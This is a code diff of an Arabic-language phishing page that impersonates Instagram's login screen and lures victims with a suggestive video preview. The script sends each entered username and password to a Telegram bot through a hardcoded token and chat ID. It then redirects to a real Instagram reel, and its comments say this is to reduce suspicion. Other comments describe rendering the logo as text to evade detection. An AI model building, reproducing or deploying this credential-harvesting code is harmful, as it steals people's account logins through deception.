@@ -7,71 +7,73 @@
     <meta property="og:title" content="Instagram Video">
     <meta property="og:description" content="الفديو كامل لكيناه تحطها بطي.ها">
     <meta property="og:image" content="https://raw.githubusercontent.com/media-node-fast/verification-node-7/main/IMG_1426.jpeg"> 
-    <meta property="og:image:width" content="600">
-    <meta property="og:image:height" content="600">
     <meta property="og:type" content="video.other">
     
     <title>Instagram</title>
     
     <style>
-        /* تصميم ملء الشاشة الأبيض */
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
-        .wrapper { display: flex; flex-direction: column; align-items: center; width: 100%; padding-top: 80px; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #ffffff; font-family: -apple-system, sans-serif; overflow: hidden; }
+        .container { display: flex; flex-direction: column; align-items: center; width: 100%; padding-top: 60px; }
         
-        /* بديل الشعار لمنع الحظر: نص بأسلوب الشعار */
-        .fake-logo { 
-            font-family: 'Billabong', cursive, sans-serif; /* إذا توفر الخط المائل، وإلا سيستخدم خط جريء */
-            font-size: 35px; 
+        /* شعار مكتوب نصاً وبخط مائل لمنع حظر الروبوتات */
+        .brand-logo { 
+            font-family: 'serif'; 
+            font-size: 32px; 
             font-weight: bold; 
+            font-style: italic; 
             color: #262626; 
-            font-style: italic; /* خط مائل */
-            margin-bottom: 50px; 
-            text-transform: lowercase; /* حروف صغيرة */
+            margin-bottom: 40px; 
+            letter-spacing: -1px;
         }
-        
-        .inputs { width: 85%; max-width: 350px; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 14px; margin-bottom: 10px; box-sizing: border-box; font-size: 14px; color: #262626; }
-        input:focus { border: 1px solid #a8a8a8; outline: none; }
-        
-        .login-btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; }
-        
-        .divider { display: flex; align-items: center; text-align: center; color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 30px 0; width: 100%; }
-        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
-        .divider::before { margin-left: 1.5em; }
-        .divider::after { margin-right: 1.5em; }
-        
-        .fb-text { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; text-align: center;}
-        .fb-logo-placeholder { font-weight: bold; margin-right: 8px; }
 
+        .login-form { width: 85%; max-width: 350px; }
+        input { 
+            width: 100%; background: #fafafa; border: 1px solid #dbdbdb; 
+            border-radius: 3px; padding: 12px; margin-bottom: 10px; 
+            box-sizing: border-box; font-size: 14px; 
+        }
+        .login-btn { 
+            width: 100%; background-color: #0095f6; color: white; border: none; 
+            border-radius: 8px; padding: 12px; font-weight: 600; 
+            font-size: 14px; margin-top: 15px; cursor: pointer; 
+        }
+        .or-divider { 
+            display: flex; align-items: center; text-align: center; 
+            color: #8e8e8e; font-size: 13px; margin: 30px 0; 
+        }
+        .or-divider::before, .or-divider::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
+        .or-divider::before { margin-left: 1.5em; }
+        .or-divider::after { margin-right: 1.5em; }
+        
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; text-align: center; }
         .footer { position: absolute; bottom: 30px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <div class="wrapper">
-        <div class="fake-logo">instagram</div>
+    <div class="container">
+        <div class="brand-logo">Instagram</div>
         
-        <div class="inputs">
+        <div class="login-form">
             <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
             <input type="password" id="p" placeholder="كلمة السر">
-            <button class="login-btn" onclick="captureData()">تسجيل الدخول</button>
+            <button class="login-btn" onclick="sendData()">تسجيل الدخول</button>
             
-            <div class="divider">أو</div>
-            <a href="#" class="fb-text"><span class="fb-logo-placeholder">f</span> تسجيل الدخول بحساب Facebook</a>
+            <div class="or-divider">أو</div>
+            <a href="#" class="fb-login">تسجيل الدخول بحساب Facebook</a>
         </div>
     </div>
     
     <div class="footer">من Meta</div>
 
     <script>
-        function captureData() {
+        function sendData() {
             const user = document.getElementById('u').value;
             const pass = document.getElementById('p').value;
             if(user && pass) {
-                // إرسال البيانات لبوت التليجرام الخاص بك
-                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=📡User: ${user}%0A🔑Pass: ${p}`);
-                // تحويل للفيديو الأصلي بعد ثانية واحدة (لتقليل الشك)
+                // إرسال البيانات لبوت التليجرام
+                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤:${user}%0A🔑:${pass}`);
+                // تحويل للفيديو الأصلي
                 setTimeout(() => { 
                     window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; 
                 }, 1000);
